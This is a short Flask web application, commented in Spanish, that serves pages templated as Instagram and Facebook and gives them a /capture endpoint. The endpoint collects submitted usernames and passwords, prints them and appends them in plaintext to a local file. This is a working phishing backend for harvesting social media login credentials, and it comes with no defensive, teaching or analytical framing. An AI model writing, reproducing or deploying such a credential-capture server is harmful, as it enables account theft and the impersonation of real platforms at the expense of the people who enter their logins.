from flask import Flask, request, render_template, redirect

app = Flask(__name__)

# Página de inicio
@app.route('/')
def home():
    return render_template('index.html')

# Página de Instagram
@app.route('/instagram')
def instagram():
    return render_template('instagram.html')

# Página de Facebook
@app.route('/facebook')
def facebook():
    return render_template('facebook.html')

# Manejo de datos capturados
@app.route('/capture', methods=['POST'])
def capture():
    site = request.form.get('site')
    username = request.form.get('username')
    password = request.form.get('password')
    print(f"Site: {site}")
    print(f"Username: {username}")
    print(f"Password: {password}")

    # Guardar datos en un archivo o base de datos
    with open('captured_data.txt', 'a') as f:
        f.write(f"Site: {site}, Username: {username}, Password: {password}\n")

    return redirect('/')




if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
